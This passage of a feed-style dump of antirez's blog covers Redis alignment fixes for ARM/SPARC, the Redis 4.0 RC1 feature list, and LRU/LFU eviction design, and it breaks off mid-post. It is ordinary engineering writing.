<br>As you can see there are separated counters for all the unaligned accesses that were corrected by the kernel, both in user space and in kernel space. In the above case 12590 accesses where corrected in kernel space. No user land process was corrected. Note that the “User faults” line shows the kernel configuration about what to do when an user space process performs an unaligned access that the CPU cannot handle: it can fix the problem, send a SIGBUS, or log the even in the kernel logs. This is controlled by single bits of an integer that can be written into /proc/cpu/alignment, so for instance in order to log (other than fix) user space unaligned accesses one can use “echo 3 > /proc/cpu/alignment” (bit 1 enables logging, bit 2 enables fixing).
<br>
<br>My feeling is that the Linux kernel enabled such a feature not much since the kernel developers were concerned with the poor user space programmers that were not able to deal with unaligned memory accesses, but because the kernel itself does not always performs unaligned accesses as you can see from the “System” counter. So this was the simplest way to fix the Linux port on ARM instead of checking every single place of the code.
<br>
<br>Given that Linux handles this transparently, one could be tempted to say, oh well… maybe there is nothing to fix here, Redis will just work as expected as long as we set /proc/cpu/alignment to fix things transparently. Actually this is not the case for two reasons:
<br>
<br>1. When an unaligned access is performed and fixed by the kernel, this results in *very* slow execution. The speed penalty is much larger than, for example, the second memory access needed when doing unaligned work-sized accesses. While this only happens with multiple loads and stores instructions, it is still a shame that in certain conditions Redis would be much slower than needed.
<br>
<br>2. The Linux kernel implementation of ARM misaligned accesses is not perfect. There is code that GCC will emit that contains instructions that are not handled well by Linux 4.4.34.
<br>
<br>A trivial example is this one:
<br>
<br>$ #include <stdlib.h>
<br>
<br>int main(int argc, char **argv) {
<br>        int count = 1000;
<br>        char *buf = malloc(count*sizeof(double));
<br>        double sum = 0;
<br>        double *l = (double*) (buf+1);
<br>        while(count--) {
<br>                l++;
<br>                sum += *l;
<br>        }
<br>        return 0;
<br>}
<br>
<br>$ gcc foo.c -g -ggdb
<br>$ ./a.out
<br>Bus error
<br>
<br>Even if the kernel configuration in my Pi is set to deal with unaligned accesses and fix them, still the program received a SIGBUS!
<br>Let’s see where this happens with GDB:
<br>
<br>$ gdb ./a.out
<br>(gdb) run
<br>
<br>Program received signal SIGBUS, Bus error.
<br>0x00010484 in main (argc=1, argv=0xbefff3b4) at foo.c:10
<br>10	                sum += *l;
<br>
<br>Well it’s in the inner loop when our non aligned double pointer is deferenced, as expected.
<br>But we may want to check further what’s happening, checking the ARM instruction that generated the exception:
<br>
<br>(gdb) x/i $pc
<br>=> 0x10484 <main+100>:	vldr	d6, [r11, #-20]	; 0xffffffec
<br>
<br>The VLDR instruction is used in order to load an extension register from a memory location, and is used for floating point math. For some reason the Linux kernel implementation of unaligned accesses correction, is not able to handle this instruction (I guess the implementation is just not complete as it should). The “dmesg” command will indeed show that the instruction was not recognized by the function that fixes the unaligned accesses:
<br>
<br>[317778.925569] Alignment trap: not handling instruction ed937b00 at [<00010480>]
<br>[317778.925610] Unhandled fault: alignment exception (0x011) at 0x01cb8011
<br>
<br>So, if the default C compiler in the Pi could emit code that the default Linux kernel could not handle, I really wanted Redis to be able to run without issues even when the kernel is configured for not fixing the unaligned accesses. This means that Redis on ARM should only perform word-sized unaligned accesses, the only ones that the CPU can handle transparently.
<br>
<br>Fixing the bugs
<br>—
<br>
<br>Given that ARM deals well with most unaligned memory accesses, Redis appeared to be already working on the Pi, mostly. Especially since by default the kernel is configured to fix many of the unaligned accesses that are not supported. Even with the alignment fixing disabled, it still superficially worked. However running the tests revealed different crashes, especially in obvious areas like bit operations and hash functions.
<br>
<br>The first thing now Redis does is to define USE_ALIGNED_ACCESS when compiled into architectures that don’t support unaligned accesses. Then it was just a matter of fixing the code in order to avoid the fast paths where unaligned accesses where performed, or replacing the pointers deferencing with memcpy() operations. You may think that using memcpy() is ways slower than deferencing a pointer, but things are much better than that: for a fixed size mecpy call like memcpy(src,dst,sizeof(uint64_t)) the compiler is smart enough to avoid calling the function. It will actually generate the fastest set of instructions that will do the trick even if the address is not aligned. For instance, in x86 processors, this function call will actually be translated into a single MOV instruction.
<br>
<br>After those fixes Redis and my two Raspberries, one original model B, and a much faster Pi 3, started to be great friends: all tests passing, but one about generating call traces in crash reports (but I’m going to fix this one as well), and from time to time a few failures in the integration tests due to the slowness of the Pi to setup masters and slaves setups. However at this point my appetite for correctness was stimulated, I wanted some more alignment problems.
<br>
<br>Let’s go the extra mile: SPARC
<br>—
<br>
<br>While I was working at fixing Redis for ARM, there was a parallel issue open in the Github repository about making Redis run well on Solaris/SPARC. Now SPARC is not as gentle as ARM, it is not able to deal with *any* unaligned access. I remembered this very well as during my first years of C programming I bought a very old SPARC station 4: big endian and not able to deal with unaligned accesses of any kind at the same time, it gave me some perspective on porting programs around. It’s a shame that after a few months of having it I spilled vodka on it, frying the motherboard forever, but I still have it in my parent’s house.
<br>
<br>Solaris/SPARC deals with unaligned accesses are more complex than Linux/ARM: 32 bit unaligned accesses are always fixed by the kernel, while 64 bit unaligned accesses are handled by registering an user space trap, according to the compilation flags. The Sun Studio C compiler has specific options to control what happens in a very precise way, and even tools in order to easily detect and fix such unaligned accesses.
<br>
<br>If non-word sized unaligned accesses were rare in Redis, you could expect word-sized unaligned accesses to be everywhere. But actually it was not the case, since up to Redis 3.0 I used to test and fix Redis with an OpenBSD/SPARC box from time to time. So the biggest problem was the function to hash keys. The original Redis string library, called SDS, had a fixed sized header, so accesses were always aligned while hashing keys. Starting with Redis 3.2 the SDS header is variable in size, so this is no longer the case. Moreover there were other new unaligned accesses here and there accumulated since the last time I tested Redis on SPARC a few years ago.
<br>
<br>To fix the hash function I also switched to SipHash, so this is also a security fix for HashDoS attacks. However it’s worth to note that I’m currently using a SipHash variant with reduced number of C and D rounds: SipHash1-2. This was made in order to avoid an otherwise non trivial speed regression, however there should not be practical attacks against SipHash1-2 AFAIK, and anyway is for sure more secure than what we previously used, Murmurhash2, that is so weak in that regard that’s possible to generate seed-independent collisions.
<br>
<br>The SipHash implementation I’m using is the reference one, modified a bit in order to simplify the code and to have a case insensitive variant.
<br>It is designed in order to deal with unaligned accesses, and to be endian agnostic. The first time I see a well written reference implementation of an hash function perhaps…
<br>
<br>The other SPARC fixes were greatly simplified by a kind Redis user that provided me with a Solaris/SPARC access. In the process of fixing the unaligned accesses I also tried to fix building and testing Redis in Solaris/SPARC, so this was a good portability improvement exercise in general. After this task was completed, Redis is finally “alignment safe” at least for the stand alone code. There is more work to do in the Cluster area.
<br>
<br>Performances of Redis in the Raspberry Pi
<br>—
<br>
<br>Ok, back to the Pi :-) How fast is Redis running on such small hardware? Well, as there are more than one Pi model out there, there are multiple answers for this question. Redis on the Pi 3 is surprisingly fast. My benchmarks are performed via the loopback interface because Redis on the Pi will be mostly intended for local programs to write data to it, or to use it as a message bus for both IPC and for cloud-edge exchange of information (for cloud here I mean the central servers of an appliance, and for edge the local installation of an appliance). However it also runs well when accessed via the ethernet port.
<br>
<br>On the Pi3, I get this numbers:
<br>
<br>Test 1 : 5 millions writes with 1 million keys (even distribution among keys).  No persistence, no pipelining. 28000 ops/sec.
<br>Test 2: Like test 1 but with pipelining using groups of 8 operations: 80000 ops/sec.
<br>Test 3: Like test 1 but with AOF enabled, fsync 1 sec: 23000 ops/sec
<br>Test 4: Like test 3, but with an AOF rewrite in progress: 21000 ops/sec
<br>
<br>Basically Redis on the Pi 3 looks fast enough for any use case. Consider that Redis is mostly single threaded, or double-threaded when it rewrites the AOF log, since there is another background process, so you can expect the above performances while, at the same time, other processes are running on the Pi. Bottom line is: the numbers does not mean we are saturating the Pi.
<br>
<br>With the original model B things are *quite* different, those numbers are much lower, like 2000 ops/sec non pipelined, and 15000 ops/sec when pipelining is used. This huge gap looks to hint at very inefficient handling of syscalls like write and read that require a context switch. However they are still good enough numbers for most applications, since Redis is not going to serve external clients most of the times, and because when there is high-load data logging needed to be performed, pipelining is often simple to implement.
<br>
<br>However right now I don’t have one of the most interesting (other than the Pi 3) devices to test, which is the Pi zero. It will be interesting to see the numbers that it can deliver. They should be better than the Model B I’m using.
<br>
<br>Pi continuity
<br>—
<br>
<br>One thing I love about Redis running well on the Pi is that I’m excited about Raspberry to become, with things like the Pi zero, potentially the to-go platform for IoT products. I mean even finished products intended for the final user. I can’t stop thinking what I would like to do in the hardware space if I had time: sensors, displays, the GPIO port, and the very low price make it possible to build an hardware startup in a much simpler way compared to the past, and I love the idea that hackers around the world could now ship smart appliances of different kinds. I want to be somewhat part of this, even if marginally, providing a good Redis experience in the Pi (and in the future with Android and other ARM based systems). Redis has a good combination of low resource needs, append-only operations and data model suitable for both logging and in-device analysis of the data, in order to take actions based on historical events, so I really believe it can help in this space.
<br>
<br>So starting from now the Raspberry Pi is for me one of the main target platforms for Redis, like the Linux servers originally were set as the Redis “standard”. In the next weeks I’ll continue with the fixes, that will all go into Redis 4.0. At the same time I’ll write a new section in the Redis official site with all the informations about Redis and the Pi: benchmarks in the different devices, good practices, and so forth.
<br>Maybe in the future I’ll be also able to release proof of concept “agents” in order to use Redis as a data bus between the IoT devices and the cloud, allowing the device to just log data inside Redis, with the agent taking care of moving the data on the cloud when the link with the outside world works, and at the same time fetching commands for the device to execute and sending back replies. This will be even more interesting when the stream data structure will be available in Redis 4.2.
<br>
<br>I would love hearing about applications where you see Redis going to help in embedded setups, and what I could do in order to make it better in this regard.
<a href=\"http://antirez.com/news/111\">Comments</a>" nil "http://antirez.com/news/111" "b830dfd4b1f9bf5f197af0f6791de404") (63 (26588 31767 65887 422000) "http://antirez.com/news/110
" "The first release candidate of Redis 4.0 is out " nil "Fri, 02 Dec 2016 17:25:58 +0000" "It’s not yet stable but it’s soon to become, and comes with a long list of things that will make Redis more useful for we users: finally Redis 4.0 Release Candidate 1 is here, and is bold enough to call itself 4.0 instead of 3.4. For me semantic versioning is not a thing, what I like instead is try to communicate, using version numbers and jumps, what’s up with the new version, and in this specific case 4.0 means “this is the shit”.
<br>
<br>It’s just that Redis 4.0 has a lot of things that Redis should have had since ages, in a different world where one developer can, like Ken The Warrior, duplicate itself in ten copies and start to code. But it does not matter how hard I try to learn about new vim shortcuts, still the duplicate-me thing is not in my chords.
<br>
<br>But well, finally with 4.0 we got a lot of these stuff done… and here is the list of the big ones, with a few details and pointers to learn more.
<br>
<br>1. Modules
<br>
<br>As you probably already know Redis 4.0 got a modules system, and one that allows to do pretty fancy stuff like implementing new data types that are RDB/AOF persisted, create non blocking commands and so forth. The deal here is that all this is done with an higher level abstract API completely separated from the core, so the modules you write are going to work with new releases of Redis. Using modules I wrote Neural Redis, a neural network data type that can be trained inside Redis itself, and many people are doing very interesting stuff: there are new rate limiting commands (implemented in Rust!), Graph DBs on top of Redis, secondary indexes, time series modules, full text indexing, and a number of other stuff, and my feeling is that’s just the start.
<br>
<br>This does not just allow Redis to grow and cover new things, while taking the core, if not minimal, just with things that are useful to most users at least, pretty generic things that many people need. But also has the potential to avoid for many tasks the problem of rewriting a networked server, even if the goal is to create something not related to Redis, databases, caching, or whatever Redis is. That is, you can just write a module to use the Redis “infrastructure”: the protocol, the clients people already wrote and so forth. So I’ve a good feeling about it, no pressure for the core, freedom for the users that want to do more crazy stuff.
<br>
<br>2. Replication version 2
<br>
<br>So, that’s going to be very useful in production from the POV of operations. At some point in the past we introduced what is known as “PSYNC”. It was a new master-slave protocol that allowed the master and the salve to continue from where they were, if the connection between the two broke. Before that, every single connection break in the replication link between master and slave would result into a full synchronization: generate an RDB file in the master, transfer it, load it in the slave, ok you know how this works. So PSYNC was like a real improvement. But not enough…
<br>
<br>PSYNC was not good enough when there was a failover. If a slave is promoted to master, the slaves that replicated with the old master were not able to connect to the new promoted slave and PSYNC with it: a full resynchronization was needed. This is not great, and is not good for Redis Cluster as well. However fixing this required to do changes to the replication protocol, because I really wanted to make sure that partial resyncs where going to work after any possible topology change, as long as there was a common replication history among the instances.
<br>
<br>So the first change needed was about how “chained replication” works, that is, slaves of slaves of slaves … How do they work? Like, A is the master, and we have something like that:
<br>
<br>	A —> B —> C —> D
<br>
<br>So A is the master of B but B is the master of C and so forth. Before Redis 4.0 what was happening is that B received the replication protocol from A. The replication protocol is, normally, a stream of write commands. B acted as a master for C just doing, internally, what A was doing: at every write it was generating again a suitable replication protocol to pass to C, and so forth.
<br>
<br>Now instead B just proxies, verbatim, what it receives from A to C, and C will do the same for D: given that all the sub slaves now receive an identical stream of bytes, they can “tag” a given history, and use the tag and the offset to always try to continue if they have something in common.
<br>
<br>The master itself, when it is turned into a slave, is now able to PSYNC with the new master. And slaves can usually PSYNC with the master even after a “clean” restart, using the info inside the RDB file, that now stores the replication tags and offsets.
<br>
<br>Details are more complex than that, in order to make it working well, but well the deal here is, don’t be annoyed by full resynchronizations if possible. And PSYNC v2 does this well apparently. Please try it and let me know if you are interested in this feature.
<br>
<br>3. Cache eviction improvements
<br>
<br>Ok about that I wrote a full article months ago: http://antirez.com/news/109. So going to give you just the TLDR. We now have LFU (Last Frequently Used), and all the other policies switched to a more robust, fast and precise implementation. So big news for caching use cases. Read the full article if you care about this stuff, there are tons of infos.
<br>
<br>4. Non blocking DEL and FLUSHALL/FLUSHDB.
<br>
<br>Code name “lazy freeing of objects”, but it’s a lame name for a neat feature. There is a new command called UNLINK that just deletes a key reference in the database, and does the actual clean up of the allocations in a separated thread, so if you use UNLINK instead of DEL against a huge key the server will not block. And even better with the ASYNC options of FLUSHALL and FLUSHDB you can do that for whole DBs or for all the data inside the instance, if you want. Combined with the new SWAPDB command, that swaps two Redis databases content, FLUSHDB ASYNC can be quite interesting. Once you, for instance, populated DB 1 with the new version of the data, you can SWAPDB 0 1 and FLUSHDB ASYNC the database with the old data, and create yet a newer version and reiterate. This is only possible now because flushing a whole DB is no longer blocking.
<br>
<br>There are reasons why UNLINK is not the default for DEL. I know things… I can’t talk (**).
<br>
<br>5. Mixed RDB-AOF persistence format.
<br>
<br>Optionally, if you enable it, now AOF rewrites are performed by prefixing the AOF file with an RDB file, which is both faster to generate and to load. This is going to be very useful in certain environments, but makes the AOF file a less transparent file, so it’s an optional thing for now. This feature was talked for ages and finally is “in”.
<br>
<br>6. The new MEMORY command.
<br>
<br>I love it, as much as I loved LATENCY DOCTOR that once introduced cut the percentage of “My Redis is slow” complains in the mailing list to a minor fraction. Now we have it for the memory issues as well.
<br>
<br>127.0.0.1:6379> MEMORY DOCTOR
<br>Hi Sam, this instance is empty or is using very little memory, my issues detector can't be used in these conditions. Please, leave for your mission on Earth and fill it with some data. The new Sam and I will be back to our programming as soon as I finished rebooting.
<br>
<br>Movie rights owners will probably sue me for taking inspirations of sci-fi dialogues but that’s fine. Bring oranges for me when I’ll be in jail.
<br>
<br>MEMORY does a lot more than that.
<br>
<br>127.0.0.1:6379> MEMORY HELP
<br>1) \"MEMORY USAGE <key> [SAMPLES <count>] - Estimate memory usage of key\"
<br>2) \"MEMORY STATS                         - Show memory usage details\"
<br>3) \"MEMORY PURGE                         - Ask the allocator to release memory\"
<br>4) \"MEMORY MALLOC-STATS                  - Show allocator internal stats\"
<br>
<br>The memory usage reporting of the USAGE subcommand is going to be very useful, but also the in depth informations provided by “STATS”.
<br>
<br>For now all this is totally not documented, so have fun figuring out what the heck it does.
<br>
<br>7. Redis Cluster is now NAT / Docker compatible.
<br>
<br>But this is actually a bad news too, because the binary protocol changed in the “Cluster bus” thing nodes use to communicate, so to upgrade to 4.0 you need a mass reboot of Redis Cluster. I’m sorry I was tricked into this NAT / Docker fixes, pardon me. And I tried to make it backward compatible but there was no way to obtain this easily, or even non easily, without doing totally awkward stuff.
<br>
<br>The feature is explained in the example redis.conf file. You can’t see how I’m a bit less excited about this feature compared to the other ones, don’t you?
<br>
<br>Well… that’s it I guess, those are the major things. If you want also read the release notes here: https://raw.githubusercontent.com/antirez/redis/4.0/00-RELEASENOTES
<br>
<br>ETA to get it stable is as usually unknown: I plan to release a new RC every 2-4 weeks more or less. As bugs slow down significantly both from the point of view of severity and frequency of reporting, it will be Redis 4.0-final time. However there is a lot of doc to update as well, so I’ll have plenty of things to do.
<br>
<br>Many thanks to all the people that contributed to this release: a lot did in significant ways. In the release note above there is the list of all the commits that you can scan in order to see the names of the committers.
<br>
<br>Thanks to the Redis community and Redis Labs for making all this possible, but especially thanks to all the developers that use Redis and apply it well in every day problems to get shit done, because this is the whole point, other than having fun while coding.
<br>
<br>P.s. faster way to grab the new code is to fetch the '4.0' branch from Github. Repository is as usually antirez/redis.
<br>
<br>** Check https://news.ycombinator.com/item?id=13091370 for more info about UNLINK not being the default behavior for DEL.
<a href=\"http://antirez.com/news/110\">Comments</a>" nil "http://antirez.com/news/110" "9be9a604e7c24b49b3b407760048e55f") (62 (26588 31767 65348 164000) "http://antirez.com/news/109
" "Random notes on improving the Redis LRU algorithm " nil "Fri, 29 Jul 2016 08:04:12 +0000" "Redis is often used for caching, in a setup where a fixed maximum memory to use is specified. When new data arrives, we need to make space by removing old data. The efficiency of Redis as a cache is related to how good decisions it makes about what data to evict: deleting data that is going to be needed soon is a poor strategy, while deleting data that is unlikely to be requested again is a good one.
<br>
<br>In other terms every cache has an hits/misses ratio, which is, in qualitative terms, just the percentage of read queries that the cache is able to serve. Accesses to the keys of a cache are not distributed evenly among the data set in most workloads. Often a small percentage of keys get a very large percentage of all the accesses. Moreover the access pattern often changes over time, which means that as time passes certain keys that were very requested may no longer be accessed often, and conversely, keys that once were not popular may turn into the most accessed keys.
<br>
<br>So in general what a cache should try to do is to retain the keys that have the highest probability of being accessed in the future. From the point of view of an eviction policy (the policy used to make space to allow new data to enter) this translates into the contrary: the key with the least probability of being accessed in the future should be removed from the data set. There is only one problem: Redis and other caches are not able to predict the future.
<br>
<br>The LRU algorithm
<br>===
<br>
<br>While caches can’t predict the future, they can reason in the following way: keys that are likely to be requested again are keys that were recently requested often. Since usually access patterns don’t change very suddenly, this is an effective strategy. However the notion of “recently requested often” is more insidious that it may look at a first glance (we’ll return shortly on this). So this concept is simplified into an algorithm that is called LRU, which instead just tracks the *last time* a key was requested. Keys that are accessed with an higher frequency have a greater probability of being idle (not accessed) for a shorter time compared to keys that are rarely accessed.
<br>
<br>For instance this is a representation of four different keys accesses over time. Each “~” character is one second, while the “|” line at the end is the current instant.
<br>
<br>~~~~~A~~~~~A~~~~~A~~~~A~~~~~A~~~~~A~~|
<br>~~B~~B~~B~~B~~B~~B~~B~~B~~B~~B~~B~~B~|
<br>~~~~~~~~~~C~~~~~~~~~C~~~~~~~~~C~~~~~~|
<br>~~~~~D~~~~~~~~~~D~~~~~~~~~D~~~~~~~~~D|
<br>
<br>Key A is accessed one time every 5 seconds, key B once every 2 seconds
<br>and key C and D are both accessed every 10 seconds.
<br>
<br>Given the high frequency of accesses of key B, it has among the lowest idle
<br>times, which means its last access time is the second most recent among all the
<br>four keys.
<br>
<br>Similarly A and C idle time of 2 and 6 seconds well reflect the access
<br>frequency of both those keys. However as you can see this trick does not
<br>always work: key D is accessed every 10 seconds, however it has the most
<br>recent access time of all the keys.
<br>
<br>Still, in the long run, this algorithm works well enough. Usually keys
<br>with a greater access frequency have a smaller idle time. The LRU
<br>algorithm evicts the Least Recently Used key, which means the one with
<br>the greatest idle time. It is simple to implement because all we need to
<br>do is to track the last time a given key was accessed, or sometimes
<br>this is not even needed: we may just have all the objects we want to
<br>evict linked in a linked list. When an object is accessed we move it
<br>to the top of the list. When we want to evict objects, we evict from
<br>the tail of the list. Tada! Win.
<br>
<br>LRU in Redis: the genesis
<br>===
<br>
<br>Initially Redis had no support for LRU eviction. It was added later, when memory efficiency was a big concern. By modifying a bit the Redis Object structure I was able to make 24 bits of space. There was no room for linking the objects in a linked list (fat pointers!), moreover the implementation needed to be efficient, since the server performance should not drop too much because of the selection of the key to evict.
<br>
<br>The 24 bits in the object are enough to store the least significant
<br>bits of the current unix time in seconds. This representation, called
<br>“LRU clock” inside the source code of Redis, takes 194 days to overflow. Keys metadata are updated much often, so this was good enough.
<br>
<br>However there was another more complex problem to solve, how to select
<br>the key with the greatest idle time in order to evict it? The Redis
<br>key space is represented via a flat hash table. To add another data
<br>structure to take this metadata was not an option, however since
<br>LRU is itself an approximation of what we want to achieve, what
<br>about approximating LRU itself?
<br>
<br>The initial Redis algorithm was as simple as that: when there is to evict
<br>a key, select 3 random keys, and evict the one with the highest
<br>idle time. Basically we do random sampling over the key space and evict
<br>the key that happens to be the better. Later this “3 random keys”
<br>was turned into a configurable “N random keys” and the algorithm
<br>speed was improved so that the default was raised to 5 keys sampling
<br>without losing performances. Considering how naive it was, it worked
<br>well, very well actually. If you think at it, you always never do
<br>the best decision with this algorithm, but is very unlikely to do
<br>a very bad decision too. If there is a subset of very frequently accessed
<br>keys in the data set, out of 5 keys it is hard to be so unlucky to
<br>only sample keys with a very short idle time.
<br>
<br>However if you think at this algorithm *across* its executions, you
<br>can see how we are trashing a lot of interesting data. Maybe when
<br>sampling the N keys, we encounter a lot of good candidates, but
<br>we then just evict the best, and start from scratch again the next
<br>cycle.
<br>
<br>First rule of Fight Club is: observe your algorithms with naked eyes
<br>===
<br>
<br>At some point I was in the middle of working at the upcoming Redis
<br>3.0 release. Redis 2.8 was actively used as an LRU cache in multiple
<br>environments, and people didn’t complained too much about the
<br>precision of the eviction in Redis, but it was clear that it could
<br>be improved even without using a noticeable amount of additional CPU
<br>time, and not a single bit of additional space.
<br>
<br>However in order to improve something, you have to look at it. There
<br>are different ways to look at LRU algorithms. You can write, for example,
<br>tools that simulate different workloads, and check the hit/miss ratio
<br>at the end. This is what I did, however the hit/miss ratio depends
<br>a lot on the access pattern, so additionally to this information I
<br>wrote an utility that actually displayed the algorithm quality in a
<br>visual way.
<br>
<br>The program was very simple: it added a given number of keys, then
<br>accessed the keys sequentially so that each had a decreasing
<br>idle time. Finally 50% more keys were added (the green ones in the
<br>picture), so that half of the old keys needed to be evicted.
<br>
<br>In a perfect LRU implementation no key from the new added keys are evicted, and the initial 50% of the old dataset is evicted.
<br>
<br>This is the representation produced by the program for different
<br>versions of Redis and different settings:
<br>
<br>http://redis.io/images/redisdoc/lru_comparison.png
<br>
<br>When looking at the graph remember that the implementation we
<br>discussed so far is the one of Redis 2.8. The improvement you
<br>see in Redis 3.0 is explained in the next section.
<br>
<br>LRU V2: don’t trash away important information
<br>===
<br>
<br>With the new visual tool, I was able to try new approaches and
<br>test them in a matter of minutes. The most obvious way to improve
<br>the vanilla algorithm used by Redis was to accumulate the otherwise
<br>trashed information in a “pool” of good candidates for eviction.
<br>
<br>Basically when the N keys sampling was performed, it was used to
<br>populate a larger pool of keys (just 16 keys by default).
<br>This pool has the keys sorted by idle time, so new keys only enter
<br>the pool when they have an idle time greater than one key in the
<br>pool or when there is empty space in the pool.
<br>
<br>This small change improved the performances of the algorithm
<br>dramatically as you can see in the image I linked above and
<br>the implementation was not so complex. A couple memmove() here
<br>and there and a few profiling efforts, but I don’t remember
<br>major bugs in this area.
<br>
<br>At the same time, a new redis-cli mode to test the LRU precision
<br>was added (see the —lru-test option), so I had another way to
<br>check the performances of the LRU code with a power-law access
<br>pattern. This tool was used to validate with a different test that
<br>the new algorithm worked better with a more real-world-ish workload.
<br>It also uses pipelining and displays the accesses per second, so
<br>can be used in order to benchmark different implementations, at least
<br>to check obvious speed regressions.
<br>
<br>Least Frequently Used
<br>===
<br>
<br>The reason I’m writing this blog post right now is because a couple
<br>of days ago I worked at a partial reimplementation and to different
<br>improvements to the Redis cache eviction code.
<br>
<br>Everything started from an open issue: when you have multiple databases
<br>with Redis 3.2, the algorithm evicts making local choices. So
<br>if for example you have all keys with a small idle time in DB number 0,
<br>and all keys with large idle time in DB number 1, Redis will evict
<br>one key from each DB. A more rational choice is of course to start
<br>evicting keys from DB number 1, and only later to evict the other keys.
<br>
<br>This is usually not a big deal, when Redis is used as a cache it is
<br>rarely used with different DBs, however this is how I started to work
<br>at the eviction code again. Eventually I was able to modify the pool
<br>to include the database ID, and to use a single pool for all the DBs
<br>instead of using multiple pools. It was slower, but by profiling and
<br>tuning the code, eventually it was faster than the original
<br>implementation by around 20%.
<br>
<br>However my curiosity for this subsystem of Redis was stimulated again
<br>at that point, and I wanted to improve it. I spent a couple of days
<br>trying to improve the LRU implementation: use a bigger pool maybe?
<br>Account for the time that passes when selecting the best key?
<br>
<br>After some time, and after refining my tools, I understood that the
<br>LRU algorithm was limited by the amount of data sampled in the database
<br>and was otherwise very good and hard to improve. This is, actually,
<br>kinda evident from the image showing the different algorithms:
<br>sampling 10 keys per cycle the algorithm was almost as accurate as
<br>theoretical LRU.
<br>
<br>Since the original algorithm was hard to improve, I started to test
<br>new algorithms. If we rewind a bit to the start of the blog post, we
<br>said that LRU is actually kinda a trick. What we really want is to
<br>retain keys that have the maximum probability of being accessed in the
<br>future, that are the keys *most frequently accessed*, not the ones with
<br>the latest access.
<br>
<br>The algorithm evicting the keys with the least number of accesses
<br>is called LFU. It means Least Frequently Used, which is the feature of
<br>the keys that it attempts to kill to make space for new keys.
<br>
<br>In theory LFU is as simple as associating a counter to each key. At
<br>every access the counter gets incremented, so that we know that a given
<br>key is accessed more frequently than another key.
<br>
<br>Well, there are at least a few more problems, not specific to Redis,
<br>general issues of LFU implementations:
<br>
<br>1. With LFU you cannot use the “move to head” linked list trick used for LRU in order to take elements sorted for eviction in a simple way, since keys must be ordered by number of accesses in “perfect LFU”. Moving the accessed key to the right place can be problematic because there could be many keys with the same score, so the operation can be O(N) in the worst case, even if the key frequency counter changed just a little. Also as we’ll see in point “2” the accesses counter does not always change just a little, there are also sudden large changes.
<br>
<br>2. LFU can’t really be as trivial as, just increment the access counter
<br>on each access. As we said, access patterns change over time, so a key
<br>with an high score needs to see its score reduced over time if nobody
<br>keeps accessing it. Our algorithm must be albe to adapt over time.
<br>
<br>In Redis the first problems is not a problem: we can just use the trick
<br>used for LRU: random sampling with the pool of candidates. The second
<br>problem remains. So normally LFU implementations have some way in order
<br>to decrement, or halve the access counter from time to time.
<br>
<br>Implementing LFU in 24 bits of space
<br>===
<br>
<br>LFU has its implementation peculiarities itself, however in Redis all
<br>we can use is our 24 bit LRU field in order to model LFU. To implement
<br>LFU in just 24 bits per objects is a bit more tricky.
<br>
<br>What we need to do in 24 bits is:
<br>
<br>1. Some kind of access frequency counter.
<br>2. Enough information to decide when to halve the counter.
<br>
<br>My solution was to split the 24 bits into two fields:
<br>
<br>           16 bits      8 bits
<br>      +----------------+--------+
<br>      + Last decr time | LOG_C  |
<br>      +----------------+--------+
<br>
<br>The 16 bit field is the last decrement time, so that Redis knows the
<br>last time the counter was decremented, while the 8 bit field is the
<br>actual access counter.
<br>
<br>You are thinking that it’s pretty fast to overflow an 8 bit counter,
<br>right? Well, the trick is, instead of using just a counter, I used
<br>a logarithmic counter. This is the function that increments the
<br>counter during accesses to the keys:
<br>
<br>  uint8_t LFULogIncr(uint8_t counter) {
<br>      if (counter == 255) return 255;
<br>      double r = (double)rand()/RAND_MAX;
<br>      double baseval = counter - LFU_INIT_VAL;
<br>      if (baseval < 0) baseval = 0;
<br>      double p = 1.0/(baseval*server.lfu_log_factor+1);
<br>      if (r < p) counter++;
<br>      return counter;
<br>  }
<br>
<br>Basically the greater is the value of the counter, the less probable
<br>is that the counter will really be incremented: the code above computes
<br>a number ‘p’ between 0 and 1 which is smaller and smaller as the counter
<br>increases. Then it extracts a random number ‘r’ between 0 and 1 and only
<br>increments the counter if ‘r < p’ is true.
<br>
<br>You can configure how much aggressively the counter is implemented
<br>via redis.conf parameters, but for instance, with the default
<br>settings, this is what happens:
<br>
<br>After 100 hits the value of the counter is 10
<br>After 1000 is 18
<br>After 100k is 142
<br>After 1 million hits it reaches the 255 limit and no longer increments
<br>
<br>Now let’s see how this counter is decremented. The 16 bits are used in
<br>order to store the less significant bits of the UNIX time converted
<br>to minutes. As Redis performs random sampling scanning the key space
<br>in search of keys to populate the pool, all keys that are encountered
<br>are checked for decrement. If the last decrement was performed more than
<br>N minutes ago (with N configurable), the value of the counter is halved
<br>if it is an high value, or just decremented if it is a lower value
<br>(in the hope that we can better discriminate among keys with few
<br>accesses, given that our counter resolution is very small).
<br>
<br>There is yet another problem, new keys need a chance to survive after
<br>all. In vanilla LFU a just added key has an access score of 0, so it
<br>is a very good candidate for eviction. In Redis new keys start with
<br>an LFU value of 5. This initial value is accounted in the increment
<br>and halving algorithms. Simulations show that with this change keys have
<br>some time in order to accumulate accesses: keys with a score less than
<br>5 will be preferred (non active keys for a long time).
<br>
<br>Code and performances
<br>===
<br>
<br>The implementation described above can be found in the “unstable” branch
<br>of Redis. My initial tests show that it outperforms LRU in power-law
<br>access patterns, while using the same amount of memory per key, however
<br>real world access patterns may be different: time and space locality
<br>of accesses may change in very different ways, so I’ll be very happy
<br>to learn from real world use cases how LFU is performing, and how the
<br>two parameters that you can tune in the Redis LFU implementation change
<br>the performances for different workloads.
<br>
<br>Also an OBJECT FREQ subcommand was added in order to report the
<br>frequency counter for a given key, this can be both useful in order
<br>to observe an application access pattern, and in order to debug the
<br>LFU implementation.
<br>
<br>Note that switching at runtime between LRU and LFU policies will have
<br>the effect to start with almost random eviction, since the metadata
<br>accumulated in the 24 bits counter does not match the meaning of the
<br>newly selected policy. However over time it adapts again.
<br>
<br>There are probably many improvements possible.
<br>
<br>Ben Manes pointed me to this interesting paper, describing an algorithm
<br>called TinyLRU (http://arxiv.org/pdf/1512.00727.pdf).
<br>
<br>The paper contains a very neat idea: instead of remembering the
<br>access frequency of the current objects, let’s (probabilistically)
<br>remember the access frequency of all the objects seen so far, this
<br>way we can even refuse new keys if, from the name, we believe they
<br>are likely to get little accesses, so that no eviction is needed at all,
<br>if evicting a key means to lower the hits/misses ratio.
<br>
<br>My feeling is that this technique, while very interesting for plain
<br>GET/SET LFU caches, is not applicable to the data structure server
<br>nature of Redis: users expect the key to exist after being created
<br>at least for a few milliseconds. Refusing the key creation at all
<br>seems semantically wrong for Redis.
<br>
<br>However Redis maintains LFU informations when a key is overwritten, so
<br>for example after a:
<br>
<br>    SET oldkey some_new_value
<br>
